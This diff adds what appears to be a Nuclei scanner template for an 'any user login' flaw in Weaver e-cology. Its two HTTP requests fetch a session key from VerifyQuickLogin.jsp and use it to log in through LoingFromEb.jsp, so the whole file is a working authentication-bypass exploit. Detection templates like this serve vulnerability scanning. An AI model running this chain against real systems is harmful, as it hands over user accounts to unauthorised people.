@@ -1,0 +1,38 @@
+id:  -VerifyQuickLogin-any-user-login
+
+info:
+  name: ecology-VerifyQuickLogin-any-user-login
+  severity: critical
+  tags: "泛微"
+
+http:
+  - raw:
+      - |
+        GET /mobile/plugin/VerifyQuickLogin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=1&language=1&ipaddress=1.1.1.1
+
+      - |
+        POST /mobile/plugin/plus/login/LoingFromEb.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        loginkey={{session}}
+
+    req-condition: true
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        internal: true
+        name: session
+        regex:
+          - 'sessionkey":"(.*)"'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "RedirectFile=/wui/main.jsp"
